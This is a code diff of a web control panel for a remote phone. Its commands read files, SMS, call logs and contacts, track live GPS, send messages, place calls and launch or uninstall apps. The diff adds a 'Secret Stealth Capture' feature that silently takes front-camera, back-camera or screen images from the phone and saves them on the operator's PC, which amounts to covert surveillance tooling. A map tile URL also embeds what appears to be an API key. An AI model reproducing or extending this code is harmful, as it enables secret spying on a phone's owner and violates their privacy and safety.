             showTransferToast(`Uploaded ${fileName}!`, 100);
@@ -1569,6 +1784,7 @@
             sendCommand({ action: 'FETCH_DIR', path: currentDirPath });
         }
 
+
         // --- Image Preview ---
         function openImagePreview(filePath, fileName) {
             activePreview = {
@@ -1577,6 +1793,7 @@
                 chunks: []
             };
 
+
             document.getElementById('preview-filename').textContent = fileName;
             document.getElementById('preview-download-btn').onclick = () => triggerFileDownload(filePath, fileName);
             document.getElementById('preview-img').src = '';
@@ -1584,8 +1801,10 @@
             document.getElementById('preview-loader').classList.remove('hidden');
             document.getElementById('image-preview-modal').classList.remove('hidden');
 
+
             sendCommand({ action: 'DOWNLOAD_FILE_CHUNK', path: filePath, offset: 0 });
         }
+
 
         function handlePreviewChunk(chunk) {
             if (!activePreview) return;
@@ -1593,6 +1812,7 @@
                 document.getElementById('preview-loader').textContent = "Failed to load preview: " + chunk.error;
                 return;
             }
+
 
             if (chunk.data) {
                 const byteCharacters = atob(chunk.data);
@@ -1603,7 +1823,9 @@
                 activePreview.chunks.push(new Uint8Array(byteNumbers));
             }
 
+
             const currentLoaded = chunk.offset + (chunk.data ? atob(chunk.data).length : 0);
+
 
             if (chunk.isLast) {
                 const blob = new Blob(activePreview.chunks, { type: 'image/jpeg' });
@@ -1615,16 +1837,19 @@
             }
         }
 
+
         function closeImagePreview() {
             document.getElementById('image-preview-modal').classList.add('hidden');
             document.getElementById('preview-img').src = '';
             activePreview = null;
         }
 
+
         function isImageFile(name) {
             const ext = name.split('.').pop().toLowerCase();
             return ['jpg', 'jpeg', 'png', 'webp', 'gif', 'bmp'].includes(ext);
         }
+
 
         // --- Directory Explorer ---
         function renderDirectory(data) {
@@ -1633,8 +1858,10 @@
             parentDirPath = data.parentPath || '';
             document.getElementById('current-dir-path').textContent = currentDirPath;
 
+
             const list = document.getElementById('dir-files-list');
             list.innerHTML = '';
+
 
             const files = data.files || [];
             if (files.length === 0) {
@@ -1642,11 +1869,13 @@
                 return;
             }
 
+
             files.forEach(item => {
                 const isDir = item.isDirectory;
                 const isImg = !isDir && isImageFile(item.name);
                 const icon = isDir ? '📁' : (isImg ? '🖼️' : '📄');
                 const sizeStr = isDir ? '--' : formatBytes(item.size);
+
 
                 list.innerHTML += `
                     <div class="p-2.5 hover:bg-gray-50 flex justify-between items-center select-none">
@@ -1664,15 +1893,18 @@
             });
         }
 
+
         function navigateToDir(path) {
             sendCommand({ action: 'FETCH_DIR', path: path });
         }
+
 
         function navigateUp() {
             if (parentDirPath && parentDirPath !== currentDirPath) {
                 sendCommand({ action: 'FETCH_DIR', path: parentDirPath });
             }
         }
+
 
         function formatBytes(bytes) {
             if (bytes === 0) return '0 B';
@@ -1681,6 +1913,7 @@
             const i = Math.floor(Math.log(bytes) / Math.log(k));
             return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
         }
+
 
         // --- Photos Gallery ---
         function renderPhotos(photos) {
@@ -1691,9 +1924,11 @@
                 return;
             }
 
+
             photos.forEach(photo => {
                 const dateStr = new Date(photo.date).toLocaleDateString([], {month: 'short', day: 'numeric'});
                 const sizeStr = formatBytes(photo.size);
+
 
                 grid.innerHTML += `
                     <div class="bg-gray-50 border rounded-xl p-2.5 flex flex-col items-center justify-between hover:shadow-md transition-all cursor-pointer hover:border-cyan-400" onclick="openImagePreview('${photo.path.replace(/\\/g, '\\\\')}', '${photo.name}')">
@@ -1707,6 +1942,7 @@
                 `;
             });
         }
+
 
         // --- Window Manager Engine ---
         class WindowManager {
@@ -1760,10 +1996,12 @@
         }
         const wm = new WindowManager();
 
+
         setInterval(() => {
             const now = new Date();
             document.getElementById('clock').textContent = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
         }, 1000);
+
 
         let isSirenRinging = false;
         function toggleSiren() {
@@ -1780,6 +2018,7 @@
             }
         }
 
+
         // --- Renderers ---
         function renderStorage(storage) {
             if (!storage) return;
@@ -1788,6 +2027,7 @@
             document.getElementById('storage-free-text').textContent = `Free: ${storage.freeGB}`;
             document.getElementById('storage-percent-text').textContent = `${storage.usedPercent}% used`;
         }
+
 
         function renderCallLogs(logs) {
             const list = document.getElementById('call-logs-list');
@@ -1801,6 +2041,7 @@
                 const isIncoming = log.type === 'Incoming';
                 const badgeColor = isMissed ? 'text-red-500 bg-red-50' : (isIncoming ? 'text-blue-500 bg-blue-50' : 'text-green-500 bg-green-50');
                 const dateStr = new Date(log.date).toLocaleString([], {month: 'short', day: 'numeric', hour: '2-digit', minute:'2-digit'});
+
 
                 list.innerHTML += `
                     <div class="p-3 hover:bg-gray-50 flex justify-between items-center cursor-pointer" onclick="document.getElementById('dial-number').value='${log.number}'; wm.openWindow('contacts-window')">
@@ -1816,6 +2057,7 @@
                 `;
             });
         }
+
 
         function renderApps(apps) {
             const list = document.getElementById('apps-list');
@@ -1853,15 +2095,18 @@
             });
         }
 
+
         function launchRemoteApp(pkg, name) {
             showToast(`Opening ${name} on phone... 🚀`, "info");
             sendCommand({ action: 'LAUNCH_APP', package: pkg });
         }
 
+
         function uninstallRemoteApp(pkg, name) {
             showToast(`Triggering uninstall for ${name}... 🗑️`, "info");
             sendCommand({ action: 'UNINSTALL_APP', package: pkg });
         }
+
 
         function filterApps(query) {
             const q = query.toLowerCase();
@@ -1871,12 +2116,14 @@
             renderApps(filtered);
         }
 
+
         function syncClipboard() {
             const text = document.getElementById('clipboard-input').value;
             if (text) {
                 sendCommand({ action: 'SET_CLIPBOARD', text: text });
             }
         }
+
 
         function copyToPcClipboard() {
             const text = document.getElementById('clipboard-input').value;
@@ -1887,6 +2134,7 @@
                 });
             }
         }
+
 
         function renderSms(sms) {
             const list = document.getElementById('sms-list');
@@ -1904,6 +2152,7 @@
             });
         }
 
+
         function sendSms() {
             const to = document.getElementById('sms-to').value;
             const body = document.getElementById('sms-body').value;
@@ -1912,6 +2161,7 @@
             document.getElementById('sms-body').value = '';
             setTimeout(() => sendCommand({action: 'FETCH_SMS'}), 1000);
         }
+
 
         function renderContacts(contacts) {
             const list = document.getElementById('contacts-list');
@@ -1928,6 +2178,7 @@
             });
         }
 
+
         function makeCall() {
             const num = document.getElementById('dial-number').value;
             if(num) sendCommand({ action: 'MAKE_CALL', number: num });
@@ -1938,6 +2189,7 @@
             const toast = document.createElement('div');
             toast.className = 'bg-gray-900/95 backdrop-blur text-white rounded-xl shadow-2xl p-3.5 border border-white/10 pointer-events-auto transform transition-all duration-300 translate-x-full text-xs';
             toast.id = `toast-${notif.id}`;
+
 
             let html = `
                 <div class="flex justify-between items-start">
@@ -1951,6 +2203,7 @@
                 <div class="text-gray-300 text-[11px] mt-0.5 line-clamp-2">${notif.text}</div>
             `;
 
+
             if (notif.canReply) {
                 html += `
                     <div class="mt-2.5 flex gap-1.5">
@@ -1960,12 +2213,15 @@
                 `;
             }
 
+
             toast.innerHTML = html;
             container.appendChild(toast);
+
 
             requestAnimationFrame(() => {
                 toast.classList.remove('translate-x-full');
             });
+
 
             if (!notif.canReply) {
                 setTimeout(() => {
@@ -1975,11 +2231,13 @@
             }
         }
 
+
         function submitQuickReply(key) {
             const input = document.getElementById(`reply-input-${key}`);
             if (input && input.value.trim() !== '') {
                 const text = input.value.trim();
                 sendCommand({ action: 'QUICK_REPLY', key: key, text: text });
+
 
                 const btn = input.nextElementSibling;
                 if (btn) {
@@ -1993,9 +2251,11 @@
             }
         }
 
+
         // --- Target 6: Live GPS Map with Official CARTO API Key ---
         function renderMap(loc) {
             const statusEl = document.getElementById('map-status');
+
 
             if (!loc || loc.error || !loc.lat || !loc.lng) {
                 if (statusEl) {
@@ -2005,15 +2265,18 @@
                 return;
             }
 
+
             const lat = parseFloat(loc.lat);
             const lng = parseFloat(loc.lng);
             const accuracy = parseFloat(loc.accuracy) || 20;
             const timeStr = loc.timestamp ? new Date(loc.timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();
 
+
             if (statusEl) {
                 statusEl.innerHTML = `<span>Lat: <b>${lat.toFixed(5)}</b>, Lng: <b>${lng.toFixed(5)}</b> (±${Math.round(accuracy)}m at ${timeStr})</span>`;
                 statusEl.className = "font-mono text-[11px] text-green-700 font-medium truncate";
             }
+
 
             try {
                 if (!mapInstance) {
@@ -2022,6 +2285,7 @@
                     L.tileLayer('https://basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}.png?key=cb1_3hei_1_76590e9ed91b1cc0943b2f71', {
                         maxZoom: 20
                     }).addTo(mapInstance);
+
 
                     mapMarker = L.marker([lat, lng]).addTo(mapInstance);
                     mapCircle = L.circle([lat, lng], {
@@ -2040,6 +2304,7 @@
                     }
                 }
 
+
                 if (mapMarker) {
                     const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
                     mapMarker.bindPopup(`
@@ -2055,6 +2320,7 @@
                     `).openPopup();
                 }
 
+
                 setTimeout(() => {
                     if (mapInstance) mapInstance.invalidateSize();
                 }, 200);
@@ -2063,16 +2329,19 @@
             }
         }
 
+
         function copyCurrentCoords() {
             if (!latestLocation || !latestLocation.lat || !latestLocation.lng) {
                 alert("GPS location not available yet!");
                 return;
             }
 
+
             const lat = parseFloat(latestLocation.lat).toFixed(6);
             const lng = parseFloat(latestLocation.lng).toFixed(6);
             const textToCopy = `${lat}, ${lng}
 Google Maps: https://www.google.com/maps?q=${lat},${lng}`;
+
 
             navigator.clipboard.writeText(textToCopy).then(() => {
                 const btn = document.getElementById('copy-coords-btn');
@@ -2088,7 +2357,194 @@ Google Maps: https://www.google.com/maps?q=${lat},${lng}`;
                 prompt("Copy coordinates:", `${lat}, ${lng}`);
             });
         }
-    </script>
+    
+        // =========================================================================
+        // --- Secret Stealth Capture State & Logic ---
+        // =========================================================================
+        let secretSnapsHistory = []; // Array of { id, target, timestamp, filename, dataUrl }
+
+        function triggerSecretCapture() {
+            const selectedTarget = document.querySelector('input[name="secret-capture-target"]:checked')?.value || 'FRONT';
+            const statusText = document.getElementById('secret-status-text');
+            const captureBtn = document.getElementById('secret-capture-btn');
+            const btnLabel = document.getElementById('secret-btn-label');
+            const btnIcon = document.getElementById('secret-btn-icon');
+
+            // UI state: Capturing / Busy
+            captureBtn.disabled = true;
+            captureBtn.classList.add('opacity-60', 'cursor-not-allowed');
+            btnIcon.textContent = '⏳';
+            btnLabel.textContent = 'Capturing Silently...';
+            statusText.textContent = `● Triggering ${selectedTarget}...`;
+            statusText.className = 'text-amber-400 font-mono text-[11px] animate-pulse';
+
+            showToast(`Triggering secret capture (${selectedTarget})...`, 'info');
+
+            // Send command to phone
+            sendCommand({
+                action: 'STEALTH_CAPTURE',
+                target: selectedTarget // 'FRONT' | 'BACK' | 'SCREEN'
+            });
+
+            // Safety timeout in case device is sleeping or network packet drops
+            setTimeout(() => {
+                if (captureBtn.disabled && btnLabel.textContent.includes('Capturing')) {
+                    startCooldownOnButton();
+                    statusText.textContent = '● Request Timed Out';
+                    statusText.className = 'text-red-400 font-mono text-[11px]';
+                }
+            }, 10000);
+        }
+
+        function startCooldownOnButton() {
+            const captureBtn = document.getElementById('secret-capture-btn');
+            const btnLabel = document.getElementById('secret-btn-label');
+            const btnIcon = document.getElementById('secret-btn-icon');
+            if (!captureBtn) return;
+
+            let secondsLeft = 3;
+            btnIcon.textContent = '⏳';
+            btnLabel.textContent = `Wait ${secondsLeft}s...`;
+
+            const interval = setInterval(() => {
+                secondsLeft--;
+                if (secondsLeft > 0) {
+                    btnLabel.textContent = `Wait ${secondsLeft}s...`;
+                } else {
+                    clearInterval(interval);
+                    captureBtn.disabled = false;
+                    captureBtn.classList.remove('opacity-60', 'cursor-not-allowed');
+                    btnIcon.textContent = '📸';
+                    btnLabel.textContent = 'Capture Secret Snapshot';
+                }
+            }, 1000);
+        }
+
+        function handleStealthCaptureResult(payload) {
+            startCooldownOnButton();
+            const statusText = document.getElementById('secret-status-text');
+
+            if (payload.error || !payload.data) {
+                const errorMsg = payload.error || 'Failed to capture frame';
+                statusText.textContent = '● ' + errorMsg;
+                statusText.className = 'text-red-400 font-mono text-[11px]';
+                showToast(`Secret capture failed: ${errorMsg}`, 'error');
+                return;
+            }
+
+            const targetType = payload.target || 'SNAP';
+            const now = new Date();
+            const timeFormatted = now.toLocaleTimeString();
+            const dateFormatted = now.toISOString().slice(0, 10);
+            const filename = `Secret_${targetType}_${dateFormatted}_${Date.now().toString().slice(-4)}.jpg`;
+            const dataUrl = `data:image/jpeg;base64,${payload.data}`;
+
+            const snapItem = {
+                id: 'snap_' + Date.now(),
+                target: targetType,
+                timestamp: timeFormatted,
+                filename: filename,
+                dataUrl: dataUrl
+            };
+
+            // Prepend to history so latest appears first
+            secretSnapsHistory.unshift(snapItem);
+
+            statusText.textContent = `● Captured ${targetType} at ${timeFormatted}`;
+            statusText.className = 'text-emerald-400 font-mono text-[11px]';
+            showToast(`Secret snapshot captured (${targetType})!`, 'success');
+
+            // Re-render gallery grid (retains all past images)
+            renderSecretGallery();
+
+            // Automatically open Preview Modal for the latest captured image
+            openSecretPreview(snapItem.id);
+        }
+
+        function renderSecretGallery() {
+            const grid = document.getElementById('secret-gallery-grid');
+            const countEl = document.getElementById('secret-count');
+            if (!grid) return;
+
+            countEl.textContent = secretSnapsHistory.length;
+
+            if (secretSnapsHistory.length === 0) {
+                grid.innerHTML = `
+                    <div id="secret-empty-hint" class="col-span-full py-12 text-center text-gray-500 text-xs flex flex-col items-center justify-center gap-2">
+                        <div class="text-3xl opacity-40">📸</div>
+                        <div>No secret captures yet in this session.</div>
+                        <div class="text-[11px] text-gray-600">Select an option and click Capture.</div>
+                    </div>`;
+                return;
+            }
+
+            grid.innerHTML = secretSnapsHistory.map(snap => `
+                <div class="bg-gray-800 border border-gray-700/70 rounded-xl overflow-hidden shadow flex flex-col group hover:border-blue-500/80 transition-all">
+                    <div class="relative w-full aspect-video bg-black cursor-pointer overflow-hidden" onclick="openSecretPreview('${snap.id}')">
+                        <img src="${snap.dataUrl}" alt="${snap.filename}" class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-300" />
+                        <span class="absolute top-1.5 left-1.5 px-1.5 py-0.5 rounded text-[10px] font-bold uppercase tracking-wider bg-black/70 text-cyan-300 backdrop-blur">
+                            ${snap.target}
+                        </span>
+                        <span class="absolute bottom-1.5 right-1.5 text-[10px] text-gray-300 bg-black/60 px-1 rounded font-mono">
+                            ${snap.timestamp}
+                        </span>
+                    </div>
+                    <div class="p-2 bg-gray-900/90 flex items-center justify-between gap-1 text-[11px]">
+                        <span class="truncate text-gray-300 font-mono max-w-[110px]" title="${snap.filename}">${snap.filename}</span>
+                        <div class="flex items-center gap-1.5">
+                            <button onclick="downloadDirectBase64('${snap.dataUrl}', '${snap.filename}')" class="p-1 text-cyan-400 hover:text-cyan-200 hover:bg-cyan-900/40 rounded transition-colors" title="Save to PC">
+                                ⬇
+                            </button>
+                            <button onclick="deleteSecretSnap('${snap.id}')" class="p-1 text-gray-500 hover:text-red-400 hover:bg-red-900/40 rounded transition-colors" title="Delete from gallery">
+                                ✕
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function openSecretPreview(snapId) {
+            const snap = secretSnapsHistory.find(s => s.id === snapId);
+            if (!snap) return;
+
+            document.getElementById('preview-filename').textContent = `[Secret Snap: ${snap.target}] ${snap.filename} (${snap.timestamp})`;
+            const previewImg = document.getElementById('preview-img');
+            const previewLoader = document.getElementById('preview-loader');
+            const downloadBtn = document.getElementById('preview-download-btn');
+
+            previewLoader.classList.add('hidden');
+            previewImg.src = snap.dataUrl;
+            previewImg.classList.remove('hidden');
+
+            downloadBtn.onclick = () => downloadDirectBase64(snap.dataUrl, snap.filename);
+
+            document.getElementById('image-preview-modal').classList.remove('hidden');
+        }
+
+        function downloadDirectBase64(dataUrl, filename) {
+            const a = document.createElement('a');
+            a.href = dataUrl;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            showToast(`Saved ${filename} to your PC!`, 'success');
+        }
+
+        function deleteSecretSnap(snapId) {
+            secretSnapsHistory = secretSnapsHistory.filter(s => s.id !== snapId);
+            renderSecretGallery();
+        }
+
+        function clearSecretHistory() {
+            if (secretSnapsHistory.length === 0) return;
+            if (confirm('Clear all captured images from this session?')) {
+                secretSnapsHistory = [];
+                renderSecretGallery();
+                showToast('Secret capture history cleared', 'info');
+            }
+        }
+</script>
 </body>
 </html>
-
